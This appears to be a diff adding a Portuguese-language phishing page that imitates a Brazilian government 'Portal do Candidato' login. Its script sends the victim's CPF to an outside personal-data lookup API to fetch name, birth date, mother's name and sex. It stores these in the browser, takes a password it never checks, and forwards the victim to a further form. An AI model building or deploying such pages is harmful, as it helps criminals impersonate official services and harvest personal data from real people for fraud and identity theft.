@@ -1,0 +1,431 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="robots" content="noindex, nofollow">
+<title>Login - Portal do Candidato</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:'Open Sans','Segoe UI',Roboto,sans-serif;color:#333;background:#fff;-webkit-font-smoothing:antialiased;line-height:1.5;min-height:100vh}
+a{color:#1351B4;text-decoration:none}
+a:hover{text-decoration:underline}
+img{max-width:100%;height:auto;display:block}
+button{font-family:inherit;cursor:pointer}
+input{font-family:inherit}
+
+.top-bar{background:#fff;border-bottom:1px solid #e0e0e0;position:relative;z-index:10}
+.top-bar-inner{max-width:1280px;margin:0 auto;padding:10px 32px;display:flex;align-items:center;justify-content:space-between}
+.top-left .header-logo{height:28px;width:auto}
+.top-right{display:flex;align-items:center;gap:20px}
+.top-opt{display:inline-flex;align-items:center;gap:6px;font-size:12px;color:#1351B4;font-weight:600;cursor:pointer;background:none;border:none;padding:4px 0}
+.top-opt svg{width:16px;height:16px;fill:#1351B4}
+.top-opt:hover{text-decoration:underline}
+
+.login-wrap{display:flex;min-height:calc(100vh - 52px)}
+
+.login-left{flex:0 0 50%;position:relative;overflow:hidden}
+.login-left img{width:100%;height:100%;object-fit:cover;object-position:center;display:block}
+
+.login-right{flex:1;display:flex;align-items:flex-start;justify-content:center;padding:60px 48px 40px;overflow-y:auto}
+.form-box{width:100%;max-width:420px}
+.form-title{font-size:19px;font-weight:700;color:#333;margin-bottom:28px}
+
+.field-header{display:flex;align-items:center;gap:8px;margin-bottom:4px}
+.field-header svg{width:20px;height:20px;fill:#1351B4;flex-shrink:0}
+.field-header span{font-size:14px;font-weight:700;color:#333}
+.field-sub{font-size:12.5px;color:#555;margin-bottom:18px;line-height:1.5}
+.field-sub a{font-weight:700}
+
+.field-label{font-size:13px;font-weight:700;color:#333;margin-bottom:6px;display:block}
+.field-input{width:100%;padding:12px 14px;border:1px solid #bbb;border-radius:4px;font-size:15px;color:#333;outline:none;transition:border-color .2s}
+.field-input:focus{border-color:#1351B4;box-shadow:0 0 0 2px rgba(19,81,180,.12)}
+.field-input::placeholder{color:#999}
+.field-input.error{border-color:#e74c3c}
+
+.btn-continuar{width:100%;padding:13px;background:#1351B4;color:#fff;font-size:15px;font-weight:700;border:none;border-radius:100px;cursor:pointer;margin-top:20px;transition:background .2s;display:flex;align-items:center;justify-content:center;gap:8px}
+.btn-continuar:hover{background:#0c3a8a}
+.btn-continuar:disabled{background:#8fadd4;cursor:not-allowed}
+
+.spinner{width:18px;height:18px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite;display:none}
+@keyframes spin{to{transform:rotate(360deg)}}
+.btn-continuar.loading .spinner{display:block}
+.btn-continuar.loading .btn-text{display:none}
+
+.separator{margin:24px 0 20px;border:none;border-top:1px solid #e0e0e0}
+
+.help-section{margin-top:24px;padding-top:16px;border-top:1px solid #e0e0e0}
+.help-link{display:flex;align-items:center;gap:8px;font-size:13.5px;color:#1351B4;font-weight:600;margin-bottom:10px;cursor:pointer}
+.help-link svg{width:18px;height:18px;fill:#1351B4;flex-shrink:0}
+.help-link:hover{text-decoration:underline}
+.terms-link{font-size:13px;color:#1351B4;text-decoration:underline;display:inline-block;margin-top:4px}
+.terms-link:hover{color:#0c3a8a}
+
+.error-msg{font-size:12.5px;color:#e74c3c;margin-top:6px;display:none}
+.error-msg.show{display:block}
+
+.step{display:none}
+.step.active{display:block}
+
+.user-greeting{display:flex;align-items:center;gap:12px;margin-bottom:20px;padding:14px 16px;background:#f2f7fc;border-radius:6px;border:1px solid #d0dff0}
+.user-avatar{width:40px;height:40px;border-radius:50%;background:#1351B4;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.user-avatar svg{width:22px;height:22px;fill:#fff}
+.user-name{font-size:14px;font-weight:700;color:#333}
+.user-cpf{font-size:12px;color:#777}
+
+.pwd-toggle{position:relative}
+.pwd-toggle .field-input{padding-right:44px}
+.pwd-eye{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:none;border:none;cursor:pointer;padding:4px}
+.pwd-eye svg{width:20px;height:20px;fill:#777}
+
+@media(max-width:960px){
+  .login-left{display:none}
+  .login-wrap{justify-content:center}
+  .login-right{padding:40px 24px 30px;align-items:flex-start;justify-content:center}
+  .form-box{border:1px solid #e0e0e0;border-radius:6px;padding:32px 28px;box-shadow:0 1px 4px rgba(0,0,0,.06)}
+  .top-right .top-opt span{display:none}
+}
+@media(max-width:600px){
+  .top-bar-inner{padding:8px 16px}
+  .top-left .header-logo{height:28px}
+  .top-right{gap:10px}
+  .top-opt svg{width:18px;height:18px}
+  .login-right{padding:28px 16px 24px}
+  .form-box{padding:24px 20px}
+  .form-title{font-size:17px;margin-bottom:22px}
+  .field-input{padding:11px 12px;font-size:14px}
+  .btn-continuar{font-size:14px;padding:12px}
+}
+</style>
+</head>
+<body>
+
+<header class="top-bar">
+  <div class="top-bar-inner">
+    <div class="top-left">
+      <img src="images/BoufTZvJq0uv.svg" alt="Portal" class="header-logo">
+    </div>
+    <div class="top-right">
+      <button class="top-opt" type="button">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="none" stroke="#1351B4" stroke-width="2"></circle><path d="M12 16v-4m0-4h.01"></path></svg>
+        Alto Contraste
+      </button>
+      <button class="top-opt" type="button">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 3c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2zm-3 7v2l-2 4h1.5l1-2h5l1 2H17l-2-4v-2c0-.6-.4-1-1-1h-4c-.6 0-1 .4-1 1zm-1 8l-1 3h1l1-2h6l1 2h1l-1-3H8z"></path></svg>
+        VLibras
+      </button>
+    </div>
+  </div>
+</header>
+
+<main class="login-wrap">
+
+  <div class="login-left">
+    <img src="images/YBJ7J9u5G1kK.jpg" alt="Portal - Identificação do candidato">
+  </div>
+
+  <div class="login-right">
+    <div class="form-box">
+
+      <div class="step active" id="stepCpf">
+        <h1 class="form-title">Identifique-se no portal com:</h1>
+
+        <div class="field-header">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V6h16v12zM6 10h2v2H6v-2zm0 4h8v2H6v-2zm10 0h2v2h-2v-2zm-6-4h8v2h-8v-2z"></path></svg>
+          <span>Número do CPF</span>
+        </div>
+        <p class="field-sub">Digite seu CPF para <a href="#">criar</a> ou <a href="#">acessar</a> sua conta</p>
+
+        <label class="field-label" for="cpfInput">CPF</label>
+        <input type="text" id="cpfInput" class="field-input" placeholder="Digite seu CPF" maxlength="14" autocomplete="off" inputmode="numeric">
+        <div class="error-msg" id="cpfError">CPF inválido. Verifique os números digitados.</div>
+
+        <button type="button" class="btn-continuar" id="btnCpf" onclick="handleCpfStep()">
+          <span class="btn-text">Continuar</span>
+          <div class="spinner"></div>
+        </button>
+
+        <div class="help-section">
+          <a href="#" class="help-link">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"></path></svg>
+            Está com dúvidas e precisa de ajuda?
+          </a>
+          <a href="#" class="terms-link">Termo de Uso e Aviso de Privacidade</a>
+        </div>
+      </div>
+
+      <div class="step" id="stepPwd">
+        <h1 class="form-title">Digite sua senha</h1>
+
+        <div class="user-greeting" id="userGreeting">
+          <div class="user-avatar">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 12c2.76 0 5-2.24 5-5s-2.24-5-5-5-5 2.24-5 5 2.24 5 5 5zm0 2c-3.33 0-10 1.67-10 5v2h20v-2c0-3.33-6.67-5-10-5z"></path></svg>
+          </div>
+          <div>
+            <div class="user-name" id="userName">-</div>
+            <div class="user-cpf" id="userCpfDisplay">-</div>
+          </div>
+        </div>
+
+        <label class="field-label" for="pwdInput">Senha</label>
+        <div class="pwd-toggle">
+          <input type="password" id="pwdInput" class="field-input" placeholder="Digite sua senha" autocomplete="off">
+          <button type="button" class="pwd-eye" onclick="togglePwd()">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" id="eyeIcon"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"></path></svg>
+          </button>
+        </div>
+        <div class="error-msg" id="pwdError">Digite sua senha para continuar.</div>
+
+        <button type="button" class="btn-continuar" id="btnPwd" onclick="handlePwdStep()">
+          <span class="btn-text">Continuar</span>
+          <div class="spinner"></div>
+        </button>
+
+        <div class="help-section">
+          <a href="#" class="help-link">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"></path></svg>
+            Esqueci minha senha
+          </a>
+          <a href="#" class="terms-link">Termo de Uso e Aviso de Privacidade</a>
+        </div>
+      </div>
+
+    </div>
+  </div>
+
+</main>
+
+<script>
+var cpfInput = document.getElementById('cpfInput');
+var cpfError = document.getElementById('cpfError');
+var pwdInput = document.getElementById('pwdInput');
+var pwdError = document.getElementById('pwdError');
+var personData = null;
+
+cpfInput.addEventListener('input', function(){
+  var v = this.value.replace(/\D/g,'');
+  if(v.length>11) v = v.slice(0,11);
+  if(v.length>9) v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6,9)+'-'+v.slice(9);
+  else if(v.length>6) v = v.slice(0,3)+'.'+v.slice(3,6)+'.'+v.slice(6);
+  else if(v.length>3) v = v.slice(0,3)+'.'+v.slice(3);
+  this.value = v;
+  cpfError.classList.remove('show');
+  cpfInput.classList.remove('error');
+});
+
+cpfInput.addEventListener('keydown', function(e){
+  if(e.key==='Enter'){e.preventDefault();handleCpfStep();}
+});
+
+pwdInput.addEventListener('keydown', function(e){
+  if(e.key==='Enter'){e.preventDefault();handlePwdStep();}
+});
+
+function validateCPF(raw){
+  if(raw.length!==11||/^(\d)\1{10}$/.test(raw)) return false;
+  var sum=0,rem;
+  for(var i=0;i<9;i++) sum+=parseInt(raw.charAt(i))*(10-i);
+  rem=(sum*10)%11;
+  if(rem===10||rem===11) rem=0;
+  if(rem!==parseInt(raw.charAt(9))) return false;
+  sum=0;
+  for(var i=0;i<10;i++) sum+=parseInt(raw.charAt(i))*(11-i);
+  rem=(sum*10)%11;
+  if(rem===10||rem===11) rem=0;
+  return rem===parseInt(raw.charAt(10));
+}
+
+function timedRequest(url, ms){
+  var ctrl = new AbortController();
+  var t = setTimeout(function(){ ctrl.abort(); }, ms);
+  return fetch(url,{signal:ctrl.signal}).finally(function(){ clearTimeout(t); });
+}
+
+function formatDateStr(raw){
+  if(!raw) return null;
+  if(/^\d{4}-\d{2}-\d{2}/.test(raw)) return raw;
+  if(/^\d{2}\/\d{2}\/\d{4}/.test(raw)){
+    var p = raw.split('/');
+    return p[2]+'-'+p[1]+'-'+p[0];
+  }
+  if(/^\d{8}$/.test(raw)){
+    return raw.slice(0,4)+'-'+raw.slice(4,6)+'-'+raw.slice(6,8);
+  }
+  return raw;
+}
+
+
+async function fetchPersonData(doc) {
+    var sources = [
+        async function() {
+            var url = 'https://searchapi.it.com/consulta?cpf=' +
+                encodeURIComponent(doc) +
+                '&token_api=2077';
+
+            var res = await timedRequest(url, 6000);
+
+            if (!res.ok) {
+                throw new Error('API indisponível');
+            }
+
+            var data = await res.json();
+
+            // IDENTIFICAR FORMATO DA RESPOSTA
+            var retorno = data?.dados ||
+                          data?.DADOS ||
+                          data?.resultado ||
+                          data?.RESULTADO ||
+                          data?.result ||
+                          data?.data ||
+                          data;
+
+            var d = Array.isArray(retorno)
+                ? retorno[0]
+                : retorno;
+
+            if (!d || !(d.NOME || d.nome || d.nome_completo)) {
+                throw new Error('Dados não encontrados na API');
+            }
+
+            // EXTRAIR DATA DE NASCIMENTO
+            var nascimento = d.NASC ||
+                             d.nasc ||
+                             d.data_nascimento ||
+                             d.DATA_NASCIMENTO ||
+                             d.nascimento ||
+                             d.NASCIMENTO ||
+                             d.dataNascimento ||
+                             d.dt_nascimento ||
+                             '';
+
+            // RETORNAR NO FORMATO ORIGINAL DO SITE
+            return {
+                DADOS: {
+                    CPF: d.CPF || d.cpf || doc,
+
+                    NOME: d.NOME ||
+                          d.nome ||
+                          d.nome_completo ||
+                          '',
+
+                    NASC: nascimento
+                        ? formatDateStr(nascimento)
+                        : '',
+
+                    NOME_MAE: d.NOME_MAE ||
+                              d.nome_mae ||
+                              d.nomeMae ||
+                              '',
+
+                    SEXO: d.SEXO ||
+                          d.sexo ||
+                          ''
+                }
+            };
+        }
+    ];
+
+    for (var i = 0; i < sources.length; i++) {
+        try {
+            var result = await sources[i]();
+            return result;
+        } catch (e) {
+            console.warn(
+                'Person source ' + (i + 1) +
+                ' failed: ' + e.message
+            );
+        }
+    }
+
+    return null;
+}
+
+
+function formatCpfDisplay(cpf){
+  if(cpf.length===11) return cpf.slice(0,3)+'.***.**'+cpf.slice(8,9)+'-'+cpf.slice(9);
+  return cpf;
+}
+
+async function handleCpfStep(){
+  var raw = cpfInput.value.replace(/\D/g,'');
+  if(!validateCPF(raw)){
+    cpfError.classList.add('show');
+    cpfInput.classList.add('error');
+    return;
+  }
+
+  var btn = document.getElementById('btnCpf');
+  btn.classList.add('loading');
+  btn.disabled = true;
+
+  try {
+    personData = await fetchPersonData(raw);
+  } catch(e) {
+    console.error('Fetch error:', e);
+  }
+
+  var nome = '-';
+  var cpfDisp = formatCpfDisplay(raw);
+
+  if(personData && personData.DADOS){
+    var d = personData.DADOS;
+    nome = d.NOME || '-';
+    localStorage.setItem('cd_esa', raw);
+    localStorage.setItem('cdt_esa', JSON.stringify(d));
+    localStorage.setItem('cp_esa', '1');
+  } else {
+    localStorage.setItem('cd_esa', raw);
+    localStorage.setItem('cdt_esa', JSON.stringify({CPF:raw,NOME:'',NASC:'',NOME_MAE:'',SEXO:''}));
+    localStorage.setItem('cp_esa', '0');
+  }
+
+  document.getElementById('userName').textContent = nome;
+  document.getElementById('userCpfDisplay').textContent = cpfDisp;
+
+  btn.classList.remove('loading');
+  btn.disabled = false;
+
+  document.getElementById('stepCpf').classList.remove('active');
+  document.getElementById('stepPwd').classList.add('active');
+  pwdInput.focus();
+}
+
+function handlePwdStep(){
+  var pwd = pwdInput.value.trim();
+  if(pwd.length===0){
+    pwdError.classList.add('show');
+    pwdInput.classList.add('error');
+    return;
+  }
+
+  var btn = document.getElementById('btnPwd');
+  btn.classList.add('loading');
+  btn.disabled = true;
+
+  setTimeout(function(){
+    window.location.href = '../formulario.html/';
+  }, 800);
+}
+
+function togglePwd(){
+  var inp = document.getElementById('pwdInput');
+  var icon = document.getElementById('eyeIcon');
+  if(inp.type==='password'){
+    inp.type='text';
+    icon.innerHTML='<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>';
+  } else {
+    inp.type='password';
+    icon.innerHTML='<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
+  }
+}
+
+pwdInput.addEventListener('input', function(){
+  pwdError.classList.remove('show');
+  pwdInput.classList.remove('error');
+});
+</script>
+
+
+
+</body></html>
